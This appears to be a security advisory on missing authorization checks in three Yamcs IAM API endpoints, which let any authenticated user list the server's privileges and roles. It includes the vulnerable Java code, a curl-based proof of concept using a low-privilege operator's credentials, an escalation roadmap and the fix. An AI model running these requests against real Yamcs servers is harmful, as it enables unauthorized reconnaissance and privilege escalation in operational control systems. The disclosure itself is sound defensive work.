# Yamcs's Missing Authorization on Role and Privilege Enumeration Endpoints Allows Any Authenticated User to Disclose Full Security Configuration

- CWE: CWE-285, CWE-862
- Packages: maven:org.yamcs:yamcs-core, maven:org.yamcs:yamcs-core

---

## Summary

Missing authorization checks on three IAM API endpoints (`GET /api/roles`, `GET /api/roles/{name}`, `GET /api/privileges`) allow any authenticated user — regardless of their assigned permissions — to enumerate the complete list of system privileges and role definitions. An attacker with only a low-privilege account (e.g., a read-only operator) can retrieve the full privilege taxonomy of the server, including the names and assignments of all administrator-level capabilities. This information directly enables targeted privilege escalation attacks.

---

## Details

Three handler methods in `IamApi.java` serve sensitive security metadata without performing any authorization check:

**File:** `yamcs-core/src/main/java/org/yamcs/http/api/IamApi.java`

```java
// Line 73 — GET /api/roles
@Override
public void listRoles(Context ctx, Empty request, Observer<ListRolesResponse> observer) {
    SecurityStore securityStore = YamcsServer.getServer().getSecurityStore();
    List<Role> roles = securityStore.getDirectory().getRoles();
    // No ctx.checkSystemPrivilege() call — any authenticated user proceeds
    ...
    observer.complete(responseb.build());
}

// Line 87 — GET /api/roles/{name}
@Override
public void getRole(Context ctx, GetRoleRequest request, Observer<RoleInfo> observer) {
    SecurityStore securityStore = YamcsServer.getServer().getSecurityStore();
    Role role = securityStore.getDirectory().getRole(request.getName());
    // No ctx.checkSystemPrivilege() call
    observer.complete(toRoleInfo(role));
}

// Line 112 — GET /api/privileges
@Override
public void listPrivileges(Context ctx, Empty request, Observer<ListPrivilegesResponse> observer) {
    SecurityStore securityStore = YamcsServer.getServer().getSecurityStore();
    List<SystemPrivilege> privileges = new ArrayList<>(securityStore.getSystemPrivileges());
    // No ctx.checkSystemPrivilege() call
    observer.complete(responseb.build());
}
```

By contrast, all write operations and user-management endpoints in the same file correctly enforce authorization. For example:

```java
// Line 126 — GET /api/users (correctly protected)
public void listUsers(...) {
    ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess);  // ← present
    ...
}

// Line 142 — POST /api/users (correctly protected)
public void createUser(...) {
    ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess);  // ← present
    ...
}
```

The three vulnerable endpoints share the same `ControlAccess` protection requirement as the user-management endpoints but were never given the corresponding check.

**Route definitions** (confirmed in `yamcs-api/src/main/proto/yamcs/protobuf/iam/iam.proto`):

```
GET /api/privileges   → IamApi.listPrivileges()
GET /api/roles        → IamApi.listRoles()
GET /api/roles/{name} → IamApi.getRole()
```

---

## PoC
<img width="2324" height="1086" alt="image" src="https://github.com/user-attachments/assets/98ec3e81-556d-41e1-9211-10a5b9ad0d59" />

### Environment

- Yamcs version: 5.13.1-SNAPSHOT (latest master)
- Auth module: YamlAuthModule (default)
- Two accounts available: `admin` (Administrator) and `operator` (Operator)
- Calculate the Basic Auth credentials for the two accounts (this needs to be done only once). Please modify according to the actual situation. These credentials will be used in subsequent commands. Here, there is a test low-privilege account named "operator" with the password "password".

<img width="2243" height="223" alt="image" src="https://github.com/user-attachments/assets/5614013c-2143-4f61-aba3-eab1cba24b67" />

`powershell -command "[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('admin:admin'))"`

`powershell -command "[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes('operator:password'))"`

### Step 1 — Confirm that protected endpoints correctly return 403 for low-privilege users

```cmd
curl -s -o nul -w "HTTP %{http_code}" http://localhost:8090/api/users -H "Authorization: Basic b3BlcmF0b3I6cGFzc3dvcmQ="
```

Expected: `HTTP 403` — the user-list endpoint enforces `ControlAccess`.

### Step 2 — Enumerate all system privileges with the operator account

```cmd
curl -s http://localhost:8090/api/privileges -H "Authorization: Basic b3BlcmF0b3I6cGFzc3dvcmQ="
```

**Actual response (HTTP 200):**

```
C:\Users\20616>curl -s http://localhost:8090/api/privileges -H "Authorization: Basic b3BlcmF0b3I6cGFzc3dvcmQ="
{
  "systemPrivileges": ["ChangeMissionDatabase", "CommandOptions", "ControlAccess", "ControlActivities", "ControlAlarms", "ControlArchiving", "ControlCommandClearances", "ControlCommandQueue", "ControlFileTransfers", "ControlLinks", "ControlProcessor", "ControlServices", "ControlTimeCorrelation", "ControlTimeline", "CreateInstances", "GetMissionDatabase", "ManageAnyBucket", "ManageParameterLists", "ModifyCommandHistory", "ReadActivities", "ReadAlarms", "ReadCommandHistory", "ReadEvents", "ReadFileTransfers", "ReadLinks", "ReadSystemInfo", "ReadTables", "ReadTimeline", "WriteEvents", "WriteTables", "web.AccessAdminArea"]
}
```

The operator account receives the server's complete privilege taxonomy — all 31 system privileges including `ControlAccess` (full user management) and `ChangeMissionDatabase` (algorithm-level RCE, see related advisory).

### Step 3 — Enumerate all defined roles with the operator account

```cmd
curl -s http://localhost:8090/api/roles -H "Authorization: Basic b3BlcmF0b3I6cGFzc3dvcmQ="
```

**Actual response (HTTP 200):**

```
C:\Users\20616>curl -s http://localhost:8090/api/roles -H "Authorization: Basic b3BlcmF0b3I6cGFzc3dvcmQ="
{
}
```

The endpoint returns HTTP 200 (no authorization check triggered). The empty body reflects the test environment: the `YamlAuthModule` stores role names as plain strings in `users.yaml` and does not persist `Role` objects into the security store's `Directory`. In any Yamcs instance where roles have been created through the REST API (`POST /api/roles`), this endpoint returns the full role-to-privilege mapping for every defined role.

### Step 4 — Attempt to read a specific role by name

```cmd
curl -s http://localhost:8090/api/roles/Administrator -H "Authorization: Basic b3BlcmF0b3I6cGFzc3dvcmQ="
```

**Actual response:**

```
C:\Users\20616>curl -s http://localhost:8090/api/roles/Administrator -H "Authorization: Basic b3BlcmF0b3I6cGFzc3dvcmQ="
{
  "code": 404,
  "type": "NotFoundException",
  "msg": "Resource not found"
}
```

The 404 is a business-logic outcome (the role object does not exist in the `Directory` for this test configuration), **not** an authorization rejection. The server never checked whether the caller is permitted to read role data — it proceeded to the lookup and returned the lookup result. In a deployment where roles are registered as objects, this endpoint returns their full privilege configuration to any authenticated user.

### Observed vs Expected

| Request | Expected | Actual | Note |
|---------|----------|--------|------|
| `GET /api/users` (operator) | 403 | **403** ✓ | Auth check present |
| `GET /api/privileges` (operator) | 403 | **200** ✗ | **Confirmed — full privilege list leaked** |
| `GET /api/roles` (operator) | 403 | **200** ✗ | Auth check absent; empty only in this test setup |
| `GET /api/roles/Administrator` (operator) | 403 | **404** ✗ | No auth check; 404 = role not in Directory, not access denied |

---

## Impact

**Vulnerability type:** Broken Function Level Authorization (BFLA) / Missing Authorization (OWASP API Security Top 10 2023: API5)

**Who is impacted:**  
Any deployment of Yamcs that has authentication enabled (the default for production setups) and has more than one user tier. This includes the vast majority of operational Yamcs installations in ground station, satellite operations, and mission control contexts.

**Direct impact:**  
- Any authenticated user, including operators, guest accounts, or service accounts with minimal privileges, can retrieve the server's complete privilege taxonomy and all role-to-privilege mappings.

**Chained impact:**  
The disclosed privilege names and role definitions provide an attacker with a precise roadmap for privilege escalation:
1. Identify which privilege grants the capability they need (e.g., `ChangeMissionDatabase` for RCE via the algorithm engine, `ControlAccess` for full user management).
2. Identify which roles carry that privilege.
3. Target the accounts that hold those roles for credential theft, session hijacking, or social engineering.

In mission-critical environments (spacecraft operations, industrial control), unauthorized privilege escalation via this information leak could have safety implications beyond IT security.

---

## Fix

Add `ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess)` as the first statement in each of the three affected methods, matching the pattern already used by adjacent endpoints in the same file:

```java
// IamApi.java — apply to all three methods

public void listRoles(Context ctx, Empty request, Observer<ListRolesResponse> observer) {
    ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess);  // ADD THIS LINE
    ...
}

public void getRole(Context ctx, GetRoleRequest request, Observer<RoleInfo> observer) {
    ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess);  // ADD THIS LINE
    ...
}

public void listPrivileges(Context ctx, Empty request, Observer<ListPrivilegesResponse> observer) {
    ctx.checkSystemPrivilege(SystemPrivilege.ControlAccess);  // ADD THIS LINE
    ...
}
```
